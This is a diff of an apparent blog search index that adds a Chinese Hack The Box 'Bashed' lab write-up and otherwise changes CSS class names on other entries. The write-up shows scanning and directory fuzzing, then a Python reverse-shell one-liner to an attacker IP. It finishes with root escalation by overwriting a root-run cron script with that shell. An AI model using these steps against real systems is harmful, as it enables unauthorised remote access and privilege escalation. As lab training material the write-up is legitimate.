@@ -64,9 +64,159 @@
       </tags>
   </entry>
   <entry>
+    <title>HTB-Bashed</title>
+    <url>/Hackthebox/htb/htb-Bashed/</url>
+    <content><![CDATA[<style>.wjdcnebtngjx{zoom:50%;}</style><img src="/Hackthebox/htb/htb-Bashed/0f058b73659ca043de9f5240abd651ca.png" class="wjdcnebtngjx" alt="Bashed">
+
+<span id="more"></span>
+
+<table>
+<thead>
+<tr>
+<th>OS</th>
+<th>Difficulty</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Linux</td>
+<td>Easy</td>
+</tr>
+</tbody></table>
+<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ nmap <span class="token number">10.10</span>.10.68 <span class="token parameter variable">-T4</span> -p- --min-rate <span class="token number">1000</span> <span class="token parameter variable">-sV</span> <span class="token parameter variable">-sC</span>      
+Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2025</span>-04-21 <span class="token number">22</span>:53 CST
+Warning: <span class="token number">10.10</span>.10.68 giving up on port because retransmission cap hit <span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>.
+Nmap scan report <span class="token keyword">for</span> <span class="token number">10.10</span>.10.68
+Host is up <span class="token punctuation">(</span><span class="token number">0</span>.098s latency<span class="token punctuation">)</span>.
+Not shown: <span class="token number">47313</span> closed tcp ports <span class="token punctuation">(</span>conn-refused<span class="token punctuation">)</span>, <span class="token number">18221</span> filtered tcp ports <span class="token punctuation">(</span>no-response<span class="token punctuation">)</span>
+PORT   STATE SERVICE VERSION
+<span class="token number">80</span>/tcp <span class="token function">open</span>  http    Apache httpd <span class="token number">2.4</span>.18 <span class="token variable"><span class="token punctuation">((</span>Ubuntu<span class="token punctuation">))</span></span>
+<span class="token operator">|</span>_http-title: Arrexel's Development Site
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
+Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">237.89</span> seconds</code></pre>
+
+<p>访问80端口，存在站点</p>
+<img src="/Hackthebox/htb/htb-Bashed/image-20250421235102449.png" class="" title="phpbash">
+
+<h3 id="FUZZ"><a href="#FUZZ" class="headerlink" title="FUZZ"></a>FUZZ</h3><p>使用ffuf猜解目录，找到dev目录</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">$ ffuf <span class="token parameter variable">-w</span> /opt/secLists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ <span class="token parameter variable">-u</span> <span class="token string">'http://10.10.10.68/FUZZ'</span>  <span class="token parameter variable">-ic</span> <span class="token parameter variable">-t</span> <span class="token number">100</span> 
+
+        /<span class="token string">'___\  /'</span>___<span class="token punctuation">\</span>           /'___<span class="token punctuation">\</span>       
+       /<span class="token punctuation">\</span> <span class="token punctuation">\</span>__/ /<span class="token punctuation">\</span> <span class="token punctuation">\</span>__/  __  __  /<span class="token punctuation">\</span> <span class="token punctuation">\</span>__/       
+       <span class="token punctuation">\</span> <span class="token punctuation">\</span> ,__<span class="token punctuation">\</span><span class="token punctuation">\</span> <span class="token punctuation">\</span> ,__<span class="token punctuation">\</span>/<span class="token punctuation">\</span> <span class="token punctuation">\</span>/<span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> ,__<span class="token punctuation">\</span>      
+        <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_/ <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_/<span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_/      
+         <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span>   <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span>  <span class="token punctuation">\</span> <span class="token punctuation">\</span>____/  <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span>       
+          <span class="token punctuation">\</span>/_/    <span class="token punctuation">\</span>/_/   <span class="token punctuation">\</span>/___/    <span class="token punctuation">\</span>/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           <span class="token builtin class-name">:</span> GET
+ :: URL              <span class="token builtin class-name">:</span> http://10.10.10.68/FUZZ
+ :: Wordlist         <span class="token builtin class-name">:</span> FUZZ: /opt/secLists/Discovery/Web-Content/directory-list-2.3-medium.txt
+ :: Follow redirects <span class="token builtin class-name">:</span> <span class="token boolean">false</span>
+ :: Calibration      <span class="token builtin class-name">:</span> <span class="token boolean">false</span>
+ :: Timeout          <span class="token builtin class-name">:</span> <span class="token number">10</span>
+ :: Threads          <span class="token builtin class-name">:</span> <span class="token number">100</span>
+ :: Matcher          <span class="token builtin class-name">:</span> Response status: <span class="token number">200</span>-299,301,302,307,401,403,405,500
+________________________________________________
+
+                        <span class="token punctuation">[</span>Status: <span class="token number">200</span>, Size: <span class="token number">7743</span>, Words: <span class="token number">2956</span>, Lines: <span class="token number">162</span>, Duration: 213ms<span class="token punctuation">]</span>
+images                  <span class="token punctuation">[</span>Status: <span class="token number">301</span>, Size: <span class="token number">311</span>, Words: <span class="token number">20</span>, Lines: <span class="token number">10</span>, Duration: 242ms<span class="token punctuation">]</span>
+uploads                 <span class="token punctuation">[</span>Status: <span class="token number">301</span>, Size: <span class="token number">312</span>, Words: <span class="token number">20</span>, Lines: <span class="token number">10</span>, Duration: 100ms<span class="token punctuation">]</span>
+php                     <span class="token punctuation">[</span>Status: <span class="token number">301</span>, Size: <span class="token number">308</span>, Words: <span class="token number">20</span>, Lines: <span class="token number">10</span>, Duration: 86ms<span class="token punctuation">]</span>
+css                     <span class="token punctuation">[</span>Status: <span class="token number">301</span>, Size: <span class="token number">308</span>, Words: <span class="token number">20</span>, Lines: <span class="token number">10</span>, Duration: 580ms<span class="token punctuation">]</span>
+dev                     <span class="token punctuation">[</span>Status: <span class="token number">301</span>, Size: <span class="token number">308</span>, Words: <span class="token number">20</span>, Lines: <span class="token number">10</span>, Duration: 2534ms<span class="token punctuation">]</span>
+js                      <span class="token punctuation">[</span>Status: <span class="token number">301</span>, Size: <span class="token number">307</span>, Words: <span class="token number">20</span>, Lines: <span class="token number">10</span>, Duration: 150ms<span class="token punctuation">]</span>
+fonts                   <span class="token punctuation">[</span>Status: <span class="token number">301</span>, Size: <span class="token number">310</span>, Words: <span class="token number">20</span>, Lines: <span class="token number">10</span>, Duration: 99ms<span class="token punctuation">]</span>
+                        <span class="token punctuation">[</span>Status: <span class="token number">200</span>, Size: <span class="token number">7743</span>, Words: <span class="token number">2956</span>, Lines: <span class="token number">162</span>, Duration: 90ms<span class="token punctuation">]</span>
+server-status           <span class="token punctuation">[</span>Status: <span class="token number">403</span>, Size: <span class="token number">299</span>, Words: <span class="token number">22</span>, Lines: <span class="token number">12</span>, Duration: 116ms<span class="token punctuation">]</span></code></pre>
+
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>访问dev目录，点击phpbash.php，发现控制台</p>
+<img src="/Hackthebox/htb/htb-Bashed/image-20250421230255079.png" class="" title="image-20250421230255079">
+
+<p>可以成功执行命令，利用控制台反弹shell</p>
+<img src="/Hackthebox/htb/htb-Bashed/image-20250421235020611.png" class="" title="image-20250421235020611">
+
+<pre class="language-bash" data-language="bash"><code class="language-bash">python <span class="token parameter variable">-c</span> <span class="token string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.33",9002));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'</span></code></pre>
+
+<p>成功接收到shell</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">nc</span> <span class="token parameter variable">-lvnp</span> <span class="token number">9001</span>                                   
+Listening on <span class="token number">0.0</span>.0.0 <span class="token number">9001</span>
+Connection received on <span class="token number">10.10</span>.10.68 <span class="token number">51968</span>
+www-data@bashed:/var/www/html$ <span class="token function">ls</span>
+about.html    css	   fonts       js	    single.html
+config.php    demo-images  images      php	    style.css
+contact.html  dev	   index.html  scroll.html  uploads</code></pre>
+
+<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>查看sudo 配置，发现可以直接切换scriptmanager </p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@bashed:/var/www/html$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
+Matching Defaults entries <span class="token keyword">for</span> www-data on bashed:
+    env_reset, mail_badpass,
+    <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin<span class="token punctuation">\</span>:/snap/bin
+
+User www-data may run the following commands on bashed:
+    <span class="token punctuation">(</span>scriptmanager <span class="token builtin class-name">:</span> scriptmanager<span class="token punctuation">)</span> NOPASSWD: ALL
+www-data@bashed:/var/www/html$ <span class="token function">sudo</span> <span class="token parameter variable">-u</span> scriptmanager <span class="token function">bash</span> <span class="token parameter variable">-i</span>
+scriptmanager@bashed:/scripts$ <span class="token function">id</span>
+<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>scriptmanager<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>scriptmanager<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>scriptmanager<span class="token punctuation">)</span></code></pre>
+
+<p>查找可利用文件，在&#x2F;scripts目录下，找到test.py和test.txt 文件，可以发现test.txt文件的权限为root 创建时间是刚刚，所以可以尝试覆盖test.py来进行提权</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">scriptmanager@bashed:/var/www/html$ <span class="token function">ls</span> /
+<span class="token function">ls</span> /
+bin   etc         lib         media  proc  sbin     sys  var
+boot  home        lib64       mnt    root  scripts  tmp  vmlinuz
+dev   initrd.img  lost+found  opt    run   srv      usr
+scriptmanager@bashed:/scripts$ <span class="token function">ls</span> <span class="token parameter variable">-la</span>
+<span class="token function">ls</span> <span class="token parameter variable">-la</span>
+total <span class="token number">16</span>
+drwxrwxr--  <span class="token number">2</span> scriptmanager scriptmanager <span class="token number">4096</span> Jun  <span class="token number">2</span>  <span class="token number">2022</span> <span class="token builtin class-name">.</span>
+drwxr-xr-x <span class="token number">23</span> root          root          <span class="token number">4096</span> Jun  <span class="token number">2</span>  <span class="token number">2022</span> <span class="token punctuation">..</span>
+-rw-r--r--  <span class="token number">1</span> scriptmanager scriptmanager  <span class="token number">213</span> Apr <span class="token number">21</span> 08:22 test.py
+-rw-r--r--  <span class="token number">1</span> root          root            <span class="token number">12</span> Apr <span class="token number">21</span> 08:22 test.txt</code></pre>
+
+<p>使用python反弹shell命令覆盖test.py 内容，然后等待一会</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">scriptmanager@bashed:/scripts$ <span class="token builtin class-name">echo</span> <span class="token string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.33",9002));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'</span> <span class="token operator">></span> test.py
+<span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span>,2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">import</span> pty<span class="token punctuation">;</span> pty.spawn<span class="token punctuation">(</span><span class="token string">"/bin/bash"</span><span class="token punctuation">)</span>' <span class="token operator">></span> test.py                         
+</code></pre>
+
+<p>成功获得root权限</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">nc</span> <span class="token parameter variable">-lvnp</span> <span class="token number">9002</span>
+Listening on <span class="token number">0.0</span>.0.0 <span class="token number">9002</span>
+Connection received on <span class="token number">10.10</span>.10.68 <span class="token number">41970</span>
+root@bashed:/scripts<span class="token comment"># id       </span>
+<span class="token function">id</span>
+<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span>
+</code></pre>
+
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Path</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>flag1</td>
+<td>&#x2F;home&#x2F;arrexel&#x2F;user.txt</td>
+</tr>
+<tr>
+<td>flag2</td>
+<td>&#x2F;root&#x2F;root.txt</td>
+</tr>
+</tbody></table>
+]]></content>
+      <categories>
+        <category>Hackthebox</category>
+      </categories>
+      <tags>
+        <tag>配置错误</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>HTB-Irked</title>
     <url>/Hackthebox/htb/htb-Irked/</url>
-    <content><![CDATA[<style>.gzvkmoukzxuw{zoom:50%;}</style><img src="/Hackthebox/htb/htb-Irked/5fb846e75cf0db0c4b27e2dc64a9bf82.png" class="gzvkmoukzxuw">
+    <content><![CDATA[<style>.lsiaknorblbh{zoom:50%;}</style><img src="/Hackthebox/htb/htb-Irked/5fb846e75cf0db0c4b27e2dc64a9bf82.png" class="lsiaknorblbh">
 
 <span id="more"></span>
 
@@ -260,7 +410,7 @@ djmardov@irked:~$ <span class="token function">id</span>
   <entry>
     <title>HTB-Nocturnal</title>
     <url>/Hackthebox/htb/htb-nocturnal/</url>
-    <content><![CDATA[<style>.prgdgiwrixui{zoom:50%;}</style><img src="/Hackthebox/htb/htb-nocturnal/f6a56cec6e9826b4ed124fb4155abc66.png" class="prgdgiwrixui">
+    <content><![CDATA[<style>.neymsohdoedy{zoom:50%;}</style><img src="/Hackthebox/htb/htb-nocturnal/f6a56cec6e9826b4ed124fb4155abc66.png" class="neymsohdoedy">
 
 <span id="more"></span>
 
@@ -683,7 +833,7 @@ ispconfig-shell<span class="token comment"># cat /root/root.txt</span></code></p
   <entry>
     <title>HTB-Previse</title>
     <url>/Hackthebox/htb/htb-previse/</url>
-    <content><![CDATA[<style>.gyrgpoikmhyh{zoom:50%;}</style><img src="/Hackthebox/htb/htb-previse/e3c542ada4b134e29e534e3081ef9650.png" class="gyrgpoikmhyh">
+    <content><![CDATA[<style>.xckmqbxvikdq{zoom:50%;}</style><img src="/Hackthebox/htb/htb-previse/e3c542ada4b134e29e534e3081ef9650.png" class="xckmqbxvikdq">
 
 <span id="more"></span>
 
@@ -911,7 +1061,7 @@ root@previse:/tmp<span class="token comment"># id      </span>
   <entry>
     <title>HTB-Busqueda</title>
     <url>/Hackthebox/htb/htb-busqueda/</url>
-    <content><![CDATA[<style>.xlpfwnjtbytc{zoom:50%;}</style><img src="/Hackthebox/htb/htb-busqueda/a6942ab57b6a79f71240420442027334.png" class="xlpfwnjtbytc">
+    <content><![CDATA[<style>.gpbyvqawwnji{zoom:50%;}</style><img src="/Hackthebox/htb/htb-busqueda/a6942ab57b6a79f71240420442027334.png" class="gpbyvqawwnji">
 
 <span id="more"></span>
 
@@ -1172,7 +1322,7 @@ connect to <span class="token punctuation">[</span><span class="token number">10
   <entry>
     <title>HTB-Sauna</title>
     <url>/Hackthebox/htb/htb-sauna/</url>
-    <content><![CDATA[<style>.bdpdxoejuiqb{zoom:50%;}</style><img src="/Hackthebox/htb/htb-sauna/f31d5d0264fadc267e7f38a9d7729d14.png" class="bdpdxoejuiqb">
+    <content><![CDATA[<style>.zmigovrhuhfs{zoom:50%;}</style><img src="/Hackthebox/htb/htb-sauna/f31d5d0264fadc267e7f38a9d7729d14.png" class="zmigovrhuhfs">
 
 <span id="more"></span>
 
@@ -1438,7 +1588,7 @@ nt authority<span class="token punctuation">\</span>system
   <entry>
     <title>HTB-Heist</title>
     <url>/Hackthebox/htb/htb-heist/</url>
-    <content><![CDATA[<style>.wybbunmsvrco{zoom:50%;}</style><img src="/Hackthebox/htb/htb-heist/131dbaba68b169bd5ff59ac09420b09f.png" class="wybbunmsvrco">
+    <content><![CDATA[<style>.xphxlxuazecx{zoom:50%;}</style><img src="/Hackthebox/htb/htb-heist/131dbaba68b169bd5ff59ac09420b09f.png" class="xphxlxuazecx">
 
 <span id="more"></span>
 
@@ -1734,7 +1884,7 @@ Mode                LastWriteTime         Length Name
   <entry>
     <title>HTB-Toolbox</title>
     <url>/Hackthebox/htb/htb-toolbox/</url>
-    <content><![CDATA[<style>.lemmintmsunx{zoom:50%;}</style><img src="/Hackthebox/htb/htb-toolbox/9d218e64149bfb00a002d94868f2e4b1.png" class="lemmintmsunx">
+    <content><![CDATA[<style>.kmqowvxlltro{zoom:50%;}</style><img src="/Hackthebox/htb/htb-toolbox/9d218e64149bfb00a002d94868f2e4b1.png" class="kmqowvxlltro">
 
 <span id="more"></span>
 
@@ -2083,7 +2233,7 @@ administrator@TOOLBOX C:<span class="token punctuation">\</span>Users<span class
   <entry>
     <title>HTB-Mirai</title>
     <url>/Hackthebox/htb/htb-mirai/</url>
-    <content><![CDATA[<style>.lhhqeywvtgje{zoom:50%;}</style><img src="/Hackthebox/htb/htb-mirai/4ef1ea77e69185063d4200d7d0142baa.png" class="lhhqeywvtgje">
+    <content><![CDATA[<style>.juiwlogfwcjx{zoom:50%;}</style><img src="/Hackthebox/htb/htb-mirai/4ef1ea77e69185063d4200d7d0142baa.png" class="juiwlogfwcjx">
 
 <span id="more"></span>
 
@@ -2270,7 +2420,7 @@ Do you know <span class="token keyword">if</span> there is any way to get them b
   <entry>
     <title>HTB-Blocky</title>
     <url>/Hackthebox/htb/htb-blocky/</url>
-    <content><![CDATA[<style>.mwqoldodvvbt{zoom:50%;}</style><img src="/Hackthebox/htb/htb-blocky/f412784c311bdf52c3655381d2c9cd21.png" class="mwqoldodvvbt">
+    <content><![CDATA[<style>.cploumjjqzwe{zoom:50%;}</style><img src="/Hackthebox/htb/htb-blocky/f412784c311bdf52c3655381d2c9cd21.png" class="cploumjjqzwe">
 
 <span id="more"></span>
 
@@ -2417,7 +2567,7 @@ root@Blocky:~<span class="token comment"># id</span>
   <entry>
     <title>HTB-Remote</title>
     <url>/Hackthebox/htb/htb-remote/</url>
-    <content><![CDATA[<style>.ewkkqqpwefts{zoom:50%;}</style><img src="/Hackthebox/htb/htb-remote/8d7c152dc9c28c9556b07dc724c6a37b.png" class="ewkkqqpwefts">
+    <content><![CDATA[<style>.ojjyrwdwysri{zoom:50%;}</style><img src="/Hackthebox/htb/htb-remote/8d7c152dc9c28c9556b07dc724c6a37b.png" class="ojjyrwdwysri">
 
 <span id="more"></span>
 
@@ -2658,7 +2808,7 @@ meterpreter <span class="token operator">></span>
   <entry>
     <title>HTB-Love</title>
     <url>/Hackthebox/htb/htb-love/</url>
-    <content><![CDATA[<style>.ipgwjghfsvqt{zoom:50%;}</style><img src="/Hackthebox/htb/htb-love/c00774d8d806b82c709c596937a92d14.png" class="ipgwjghfsvqt">
+    <content><![CDATA[<style>.bbnserieyprb{zoom:50%;}</style><img src="/Hackthebox/htb/htb-love/c00774d8d806b82c709c596937a92d14.png" class="bbnserieyprb">
 
 <span id="more"></span>
 
@@ -2866,7 +3016,7 @@ Server username: NT AUTHORITY<span class="token punctuation">\</span>SYSTEM</cod
   <entry>
     <title>HTB-BountyHunter</title>
     <url>/Hackthebox/htb/htb-bountyhunter/</url>
-    <content><![CDATA[<style>.ccluajqlhjym{zoom:50%;}</style><img src="/Hackthebox/htb/htb-bountyhunter/a24c032885e56a17a6c74cc58b63e8f4.png" class="ccluajqlhjym">
+    <content><![CDATA[<style>.kzdtwqxknmpe{zoom:50%;}</style><img src="/Hackthebox/htb/htb-bountyhunter/a24c032885e56a17a6c74cc58b63e8f4.png" class="kzdtwqxknmpe">
 
 <span id="more"></span>
 
@@ -3055,7 +3205,7 @@ __Ticket Code:__
   <entry>
     <title>HTB-DevOops</title>
     <url>/Hackthebox/htb/htb-devoops/</url>
-    <content><![CDATA[<style>.trnnszgtqcev{zoom:50%;}</style><img src="/Hackthebox/htb/htb-devoops/c74d84352f781ad5c7a4c35c0c3aa0ac.png" class="trnnszgtqcev">
+    <content><![CDATA[<style>.irqvisjnbkip{zoom:50%;}</style><img src="/Hackthebox/htb/htb-devoops/c74d84352f781ad5c7a4c35c0c3aa0ac.png" class="irqvisjnbkip">
 
 <span id="more"></span>
 
@@ -3361,8 +3511,8 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
 <img src="/DevSecOps/tools/fortifyssc/DraggedImage-10.png" class="" title="webapps">
 <p>进入<code>Apache Software Foundation\\Tomcat 9.0\\bin</code>, 点开tomcat9w –&gt; Java –&gt; Java options 添加<code>-Dfortify.home=E:\SSC\fortify </code>  –&gt; 修改内存(初始化4G，最大推荐16以上) –&gt; 应用, 然后启动Tomcat</p>
 <img src="/DevSecOps/tools/fortifyssc/DraggedImage-11.png" class="">
-<style>.tvaxwerhjwnp{zoom:150%;}</style><img src="/DevSecOps/tools/fortifyssc/DraggedImage-12.png" class="tvaxwerhjwnp" alt="修改配置">
-<style>.tcsgdldvpykh{zoom:150%;}</style><img src="/DevSecOps/tools/fortifyssc/DraggedImage-13.png" class="tcsgdldvpykh">
+<style>.tuglfjxhzeun{zoom:150%;}</style><img src="/DevSecOps/tools/fortifyssc/DraggedImage-12.png" class="tuglfjxhzeun" alt="修改配置">
+<style>.isvwtdccskqx{zoom:150%;}</style><img src="/DevSecOps/tools/fortifyssc/DraggedImage-13.png" class="isvwtdccskqx">
 
 <h4 id="安装SSC"><a href="#安装SSC" class="headerlink" title="安装SSC"></a>安装SSC</h4><p> 打开浏览器访问 <a href="http://127.0.0.1:8080/ssc/">http://127.0.0.1:8080/ssc/</a></p>
 <img src="/DevSecOps/tools/fortifyssc/DraggedImage-14.png" class="" title="访问SSC">
@@ -3399,7 +3549,7 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   <entry>
     <title>HTB-Jerry</title>
     <url>/Hackthebox/htb/htb-jerry/</url>
-    <content><![CDATA[<style>.tceuncahydbv{zoom:50%;}</style><img src="/Hackthebox/htb/htb-jerry/59f03a24178dbb2bdc94968c201e21f8.png" class="tceuncahydbv">
+    <content><![CDATA[<style>.hxjulpxtqeyk{zoom:50%;}</style><img src="/Hackthebox/htb/htb-jerry/59f03a24178dbb2bdc94968c201e21f8.png" class="hxjulpxtqeyk">
 
 <span id="more"></span>
 
@@ -3459,7 +3609,7 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   <entry>
     <title>HTB-Blue</title>
     <url>/Hackthebox/htb/htb-blue/</url>
-    <content><![CDATA[<style>.wkugoovlbuaf{zoom:50%;}</style><img src="/Hackthebox/htb/htb-blue/52e077ae40899ab8b024afd51cb29b1c.png" class="wkugoovlbuaf">
+    <content><![CDATA[<style>.hylpozudsehk{zoom:50%;}</style><img src="/Hackthebox/htb/htb-blue/52e077ae40899ab8b024afd51cb29b1c.png" class="hylpozudsehk">
 
 <span id="more"></span>
 
@@ -3509,7 +3659,7 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   <entry>
     <title>HTB-Knife</title>
     <url>/Hackthebox/htb/htb-knife/</url>
-    <content><![CDATA[<style>.iitegdfbitbs{zoom:50%;}</style><img src="/Hackthebox/htb/htb-knife/110fe6608793064cf171080150ebd0dc.png" class="iitegdfbitbs">
+    <content><![CDATA[<style>.ccmpzlulwohd{zoom:50%;}</style><img src="/Hackthebox/htb/htb-knife/110fe6608793064cf171080150ebd0dc.png" class="ccmpzlulwohd">
 
 <span id="more"></span>
 
@@ -3576,7 +3726,7 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   <entry>
     <title>HTB-Shocker</title>
     <url>/Hackthebox/htb/htb-shocker/</url>
-    <content><![CDATA[<style>.bcakrkmyoelt{zoom:50%;}</style><img src="/Hackthebox/htb/htb-shocker/efef52a0fb63d9c8db0ab6e50cb6ac79.png" class="bcakrkmyoelt">
+    <content><![CDATA[<style>.yppsulsxxpbc{zoom:50%;}</style><img src="/Hackthebox/htb/htb-shocker/efef52a0fb63d9c8db0ab6e50cb6ac79.png" class="yppsulsxxpbc">
 
 <span id="more"></span>
 
@@ -3636,7 +3786,7 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   <entry>
     <title>HTB-Tenten</title>
     <url>/Hackthebox/htb/htb-tenten/</url>
-    <content><![CDATA[<style>.wnguoeriuqhy{zoom:50%;}</style><img src="/Hackthebox/htb/htb-tenten/e58a465e93364c423cd2162945f8f7bf.png" class="wnguoeriuqhy">
+    <content><![CDATA[<style>.kwthkloxpunf{zoom:50%;}</style><img src="/Hackthebox/htb/htb-tenten/e58a465e93364c423cd2162945f8f7bf.png" class="kwthkloxpunf">
 
 <span id="more"></span>
 
@@ -3716,7 +3866,7 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   <entry>
     <title>HTB-Bastard</title>
     <url>/Hackthebox/htb/htb-bastard/</url>
-    <content><![CDATA[<style>.wdcfhnsojldt{zoom:50%;}</style><img src="/Hackthebox/htb/htb-bastard/a8d2ae87fbe6d1ccfe93522d74defb3a.png" class="wdcfhnsojldt">
+    <content><![CDATA[<style>.tyquejlxpifs{zoom:50%;}</style><img src="/Hackthebox/htb/htb-bastard/a8d2ae87fbe6d1ccfe93522d74defb3a.png" class="tyquejlxpifs">
 
 <span id="more"></span>
 
@@ -3791,7 +3941,7 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   <entry>
     <title>HTB-Granny</title>
     <url>/Hackthebox/htb/htb-granny/</url>
-    <content><![CDATA[<style>.uvwqktdzmbbl{zoom:50%;}</style><img src="/Hackthebox/htb/htb-granny/e8a122e2d713a4fb4a180bb9ccd20248.png" class="uvwqktdzmbbl">
+    <content><![CDATA[<style>.mishepvxoqch{zoom:50%;}</style><img src="/Hackthebox/htb/htb-granny/e8a122e2d713a4fb4a180bb9ccd20248.png" class="mishepvxoqch">
 
 <span id="more"></span>
 
@@ -3843,14 +3993,14 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
         <category>Hackthebox</category>
       </categories>
       <tags>
-        <tag>IIS</tag>
         <tag>配置错误</tag>
+        <tag>IIS</tag>
       </tags>
   </entry>
   <entry>
     <title>HTB-Grandpa</title>
     <url>/Hackthebox/htb/htb-grandpa/</url>
-    <content><![CDATA[<style>.sccybjmojofd{zoom:50%;}</style><img src="/Hackthebox/htb/htb-grandpa/381683fd107da11f1dc916401ae8aee0.png" class="sccybjmojofd">
+    <content><![CDATA[<style>.bmgujttjffmq{zoom:50%;}</style><img src="/Hackthebox/htb/htb-grandpa/381683fd107da11f1dc916401ae8aee0.png" class="bmgujttjffmq">
 
 <span id="more"></span>
 
@@ -3910,7 +4060,7 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   <entry>
     <title>HTB-Arctic</title>
     <url>/Hackthebox/htb/htb-arctic/</url>
-    <content><![CDATA[<style>.tgpxdyjixxdl{zoom:50%;}</style><img src="/Hackthebox/htb/htb-arctic/0d6275efbd5e48fcdc96e61b9724ae5e.png" class="tgpxdyjixxdl">
+    <content><![CDATA[<style>.okbrkcifjhdp{zoom:50%;}</style><img src="/Hackthebox/htb/htb-arctic/0d6275efbd5e48fcdc96e61b9724ae5e.png" class="okbrkcifjhdp">
 
 <span id="more"></span>
 
@@ -3983,7 +4133,7 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   <entry>
     <title>HTB-Legacy</title>
     <url>/Hackthebox/htb/htb-legacy/</url>
-    <content><![CDATA[<style>.bcoegqekkfob{zoom:50%;}</style><img src="/Hackthebox/htb/htb-legacy/60dc190c4c015cfe3a3aef9b5afca254.png" class="bcoegqekkfob">
+    <content><![CDATA[<style>.yjkpeitlhpey{zoom:50%;}</style><img src="/Hackthebox/htb/htb-legacy/60dc190c4c015cfe3a3aef9b5afca254.png" class="yjkpeitlhpey">
 
 <span id="more"></span>
 
@@ -4031,7 +4181,7 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   <entry>
     <title>HTB-Devel</title>
     <url>/Hackthebox/htb/htb-devel/</url>
